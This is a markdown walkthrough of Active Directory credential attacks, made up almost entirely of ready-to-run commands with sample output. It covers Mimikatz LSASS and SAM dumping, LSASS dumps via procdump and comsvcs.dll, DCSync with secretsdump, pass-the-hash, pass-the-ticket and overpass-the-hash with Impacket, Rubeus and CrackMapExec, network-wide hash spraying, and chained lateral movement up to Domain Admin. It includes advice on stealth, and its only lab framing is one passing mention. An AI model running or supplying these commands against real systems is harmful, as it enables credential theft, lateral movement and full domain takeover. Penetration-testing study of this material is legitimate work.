# Credential Attacks Walkthrough

Step-by-step guide for credential extraction and reuse attacks in Active Directory environments.

## Part 1: Credential Extraction

### Method 1: Mimikatz - LSASS Memory Extraction

Mimikatz extracts credentials from LSASS (Local Security Authority Subsystem Service) memory.

#### Prerequisites
- Local Administrator access on target
- Disable/evade AV (in lab environment)

#### Basic Credential Dump

```powershell
# Run Mimikatz as Administrator
mimikatz.exe

# Enable debug privileges (required for LSASS access)
mimikatz # privilege::debug
# Output: Privilege '20' OK

# Dump all logon credentials
mimikatz # sekurlsa::logonpasswords

# Example Output:
# Authentication Id : 0 ; 1234567 (00000000:0012d687)
# Session           : Interactive from 1
# User Name         : administrator
# Domain            : CORP
# Logon Server      : DC01
# Logon Time        : 1/15/2024 9:30:15 AM
# SID               : S-1-5-21-1234567890-1234567890-1234567890-500
#         msv :
#          [00000003] Primary
#          * Username : administrator
#          * Domain   : CORP
#          * NTLM     : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
#          * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
#         wdigest :
#          * Username : administrator
#          * Domain   : CORP
#          * Password : (null)
#         kerberos :
#          * Username : administrator
#          * Domain   : CORP.LOCAL
#          * Password : (null)
```

#### Dump Specific Credential Types

```powershell
# Dump Kerberos tickets
mimikatz # sekurlsa::tickets /export
# Creates .kirbi files for each ticket

# Dump only NTLM hashes
mimikatz # sekurlsa::msv

# Dump cached credentials
mimikatz # sekurlsa::dpapi

# Dump WDigest credentials (plaintext if enabled)
mimikatz # sekurlsa::wdigest

# List Kerberos tickets without exporting
mimikatz # sekurlsa::tickets
```

#### SAM and LSA Dumps

```powershell
# Dump local SAM database (local accounts)
mimikatz # lsadump::sam

# Dump SAM from offline files
mimikatz # lsadump::sam /sam:C:\sam.save /system:C:\system.save

# Dump LSA secrets (service account passwords, auto-logon)
mimikatz # lsadump::secrets

# Dump cached domain logon information
mimikatz # lsadump::cache
```

#### Alternative: Procdump + Offline Mimikatz

When you can't run Mimikatz on target:

```powershell
# On target - dump LSASS with Procdump (signed Microsoft tool)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Or use Task Manager: Details > lsass.exe > Create dump file

# Transfer lsass.dmp to attacker machine

# On attacker - analyze with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

#### Alternative: comsvcs.dll (No External Tools)

```powershell
# Find LSASS PID
tasklist /FI "IMAGENAME eq lsass.exe"

# Dump using built-in DLL (run as SYSTEM)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
```

---

### Method 2: Remote Credential Dumping with secretsdump.py

Impacket's secretsdump extracts credentials remotely over SMB.

#### Basic Remote Dump

```bash
# With password
secretsdump.py domain.local/admin:password@192.168.1.100

# With NTLM hash (Pass-the-Hash)
secretsdump.py domain.local/admin@192.168.1.100 -hashes :NTLM_HASH

# Example output:
# [*] Target system bootKey: 0x1234567890abcdef...
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435...:31d6cfe0d16ae...:::
# Guest:501:aad3b435...:31d6cfe0d16ae...:::
# [*] Dumping cached domain logon information (domain/username:hash)
# [*] Dumping LSA Secrets
# [*] $MACHINE.ACC
# CORP\WS01$:aes256-cts-hmac-sha1-96:...
# CORP\WS01$:aes128-cts-hmac-sha1-96:...
# CORP\WS01$:des-cbc-md5:...
# CORP\WS01$:plain_password_hex:...
# CORP\WS01$:aad3b435...:NTLM_HASH:::
```

#### DCSync Attack

DCSync mimics a Domain Controller requesting replication, allowing you to dump any user's credentials remotely.

**Requirements:**
- Replicating Directory Changes rights
- Replicating Directory Changes All rights
- (Domain Admins have these by default)

```bash
# Dump all domain credentials
secretsdump.py domain.local/admin:password@dc01.domain.local

# Dump only Domain Controller (faster, gets all hashes)
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc

# Dump specific user
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt

# Dump specific user with NTLM hash
secretsdump.py domain.local/admin@dc01.domain.local -hashes :NTLM_HASH -just-dc-user Administrator

# Output NTDS hashes to file
secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc -outputfile domain_hashes

# Example NTDS.dit output:
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# Administrator:500:aad3b435...:HASH:::
# Guest:501:aad3b435...:HASH:::
# krbtgt:502:aad3b435...:HASH:::
# CORP\svc_sql:1103:aad3b435...:HASH:::
# CORP\john.doe:1104:aad3b435...:HASH:::
```

#### DCSync with Mimikatz

```powershell
# DCSync specific user
mimikatz # lsadump::dcsync /user:krbtgt

# DCSync with domain specification
mimikatz # lsadump::dcsync /user:domain\Administrator /domain:corp.local

# DCSync all accounts (slow, noisy)
mimikatz # lsadump::dcsync /all /csv

# Output includes:
# * Object RDN           : Administrator
# * SAMAccountName       : Administrator
# * Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
# * Hash MD5 : ...
# * Supplemental Credentials:
#   * Kerberos-Newer-Keys
#     * aes256_hmac (4096) : ...
#     * aes128_hmac (4096) : ...
```

---

## Part 2: Pass-the-Hash (PtH)

Pass-the-Hash uses the NTLM hash directly for authentication without knowing the plaintext password.

### Using Impacket Tools

```bash
# PsExec with hash
psexec.py domain.local/Administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# WMI execution with hash
wmiexec.py domain.local/Administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# SMB execution with hash
smbexec.py domain.local/Administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# DCOM execution with hash
dcomexec.py domain.local/Administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# AT scheduler execution
atexec.py domain.local/Administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "whoami"
```

### Using CrackMapExec

```bash
# Test hash validity
crackmapexec smb 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d domain.local

# Execute command
crackmapexec smb 192.168.1.100 -u Administrator -H HASH -d domain.local -x "whoami"

# Execute PowerShell
crackmapexec smb 192.168.1.100 -u Administrator -H HASH -d domain.local -X "Get-Process"

# Dump SAM remotely
crackmapexec smb 192.168.1.100 -u Administrator -H HASH -d domain.local --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.100 -u Administrator -H HASH -d domain.local --lsa

# Spray hash across network
crackmapexec smb 192.168.1.0/24 -u Administrator -H HASH -d domain.local

# Multiple targets from file
crackmapexec smb targets.txt -u Administrator -H HASH -d domain.local
```

### Using Mimikatz (Windows)

```powershell
# Pass-the-Hash to spawn new process
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe

# The new PowerShell window has Administrator's credentials cached
# Verify with:
dir \\dc01.domain.local\c$
```

### Using Evil-WinRM

```bash
# Connect with hash
evil-winrm -i 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# With domain specified
evil-winrm -i 192.168.1.100 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d domain.local
```

---

## Part 3: Pass-the-Ticket (PtT)

Pass-the-Ticket uses stolen Kerberos tickets for authentication.

### Extract Tickets with Mimikatz

```powershell
# Export all tickets from memory
mimikatz # sekurlsa::tickets /export
# Creates [user]-[service]-[target].kirbi files

# List available tickets
mimikatz # kerberos::list

# Export current session tickets
mimikatz # kerberos::list /export
```

### Extract Tickets with Rubeus

```powershell
# Dump all tickets
.\Rubeus.exe dump

# Dump tickets for specific user
.\Rubeus.exe dump /user:Administrator

# Dump tickets in specific LUID
.\Rubeus.exe dump /luid:0x12345

# Output as base64
.\Rubeus.exe dump /nowrap
```

### Inject Tickets with Mimikatz

```powershell
# Inject ticket into current session
mimikatz # kerberos::ptt ticket.kirbi

# Inject multiple tickets
mimikatz # kerberos::ptt C:\tickets\*.kirbi

# Verify injection
mimikatz # kerberos::list
# Or
klist
```

### Inject Tickets with Rubeus

```powershell
# From .kirbi file
.\Rubeus.exe ptt /ticket:ticket.kirbi

# From base64
.\Rubeus.exe ptt /ticket:doIFvj...base64...

# Create sacrificial logon session and inject
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x12345
```

### Use Tickets from Linux

```bash
# Convert .kirbi to .ccache
ticketConverter.py admin.kirbi admin.ccache

# Set credential cache
export KRB5CCNAME=admin.ccache

# Verify ticket
klist

# Use with Impacket tools (-k flag for Kerberos, -no-pass skips password prompt)
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
wmiexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
smbclient //dc01.domain.local/c$ -k -no-pass

# Use with CrackMapExec
crackmapexec smb dc01.domain.local --use-kcache
```

---

## Part 4: Overpass-the-Hash

Overpass-the-Hash uses an NTLM hash to request a Kerberos TGT, allowing Kerberos-based attacks from a hash.

### Using Impacket getTGT

```bash
# Request TGT with NTLM hash
getTGT.py domain.local/Administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 192.168.1.10

# Output: Administrator.ccache created
export KRB5CCNAME=Administrator.ccache

# Now use Kerberos authentication
psexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
wmiexec.py domain.local/Administrator@dc01.domain.local -k -no-pass
```

### Using AES Keys (More Stealthy)

```bash
# AES256 key (preferred - less suspicious)
getTGT.py domain.local/Administrator -aesKey AES256_KEY_HERE -dc-ip 192.168.1.10

# AES128 key
getTGT.py domain.local/Administrator -aesKey AES128_KEY_HERE -dc-ip 192.168.1.10
```

### Using Rubeus

```powershell
# Request TGT with NTLM hash and inject
.\Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt

# Request TGT with AES256 (more stealthy)
.\Rubeus.exe asktgt /user:Administrator /aes256:AES256_KEY /ptt

# Request TGT without injection (get base64 ticket)
.\Rubeus.exe asktgt /user:Administrator /rc4:HASH /nowrap

# Create sacrificial session and inject
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:Administrator /rc4:HASH /ptt /luid:0x12345
```

### Using Mimikatz

```powershell
# Overpass-the-Hash with NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe

# With AES256 key (more stealthy)
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:AES256_KEY /run:powershell.exe

# The spawned process now has Kerberos tickets
# Verify:
klist
```

---

## Part 5: Lateral Movement Examples

### Spray and Pray (Network-Wide)

```bash
# Find where admin hash works
crackmapexec smb 192.168.1.0/24 -u Administrator -H HASH -d domain.local

# Mark successes with Pwn3d!
# Pwn3d! = local admin access

# Execute command on all accessible
crackmapexec smb 192.168.1.0/24 -u Administrator -H HASH -d domain.local -x "hostname"
```

### Target High-Value Systems

```bash
# Domain Controllers
secretsdump.py domain.local/admin@dc01.domain.local -hashes :HASH -just-dc

# Database Servers
mssqlclient.py domain.local/admin@sql01.domain.local -hashes :HASH -windows-auth

# File Servers
smbclient //fs01.domain.local/c$ -U 'domain.local/admin%password' --pw-nt-hash HASH
```

### Chain Attacks

```bash
# 1. Compromise workstation, get user hash
secretsdump.py domain.local/user:password@ws01.domain.local

# 2. Check if user is admin anywhere
crackmapexec smb 192.168.1.0/24 -u user -H HASH -d domain.local

# 3. Pivot to new machine, extract more credentials
secretsdump.py domain.local/user@ws02.domain.local -hashes :HASH

# 4. Find higher privilege account
# Repeat until Domain Admin
```

---

## Troubleshooting

### Common Errors

**STATUS_LOGON_FAILURE**
```bash
# Wrong hash or disabled account
# Verify: crackmapexec smb target -u user -H HASH -d domain
```

**KRB_AP_ERR_SKEW**
```bash
# Time difference > 5 minutes
sudo ntpdate dc01.domain.local
```

**STATUS_ACCESS_DENIED**
```bash
# User doesn't have admin rights on target
# PtH requires local admin for most tools
```

**Module 'krb5' not found**
```bash
sudo apt install krb5-user libkrb5-dev
```

### Hash Format Reference

```
LM:NTLM format (Impacket):
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

NTLM only (with colon prefix):
:31d6cfe0d16ae931b73c59d7e0c089c0

Empty LM hash: aad3b435b51404eeaad3b435b51404ee
Empty NTLM hash: 31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Quick Reference

### Credential Extraction
```
mimikatz # sekurlsa::logonpasswords    # LSASS dump
mimikatz # lsadump::sam                 # Local SAM
mimikatz # lsadump::dcsync /user:X     # DCSync
secretsdump.py USER@TARGET              # Remote dump
```

### Pass-the-Hash
```
psexec.py USER@TARGET -hashes :HASH
wmiexec.py USER@TARGET -hashes :HASH
crackmapexec smb TARGET -u USER -H HASH
evil-winrm -i TARGET -u USER -H HASH
```

### Pass-the-Ticket
```
mimikatz # kerberos::ptt ticket.kirbi
.\Rubeus.exe ptt /ticket:ticket.kirbi
export KRB5CCNAME=ticket.ccache
psexec.py USER@TARGET -k -no-pass
```

### Overpass-the-Hash
```
getTGT.py DOMAIN/USER -hashes :HASH
.\Rubeus.exe asktgt /user:USER /rc4:HASH /ptt
mimikatz # sekurlsa::pth /user:X /ntlm:HASH /run:cmd
```
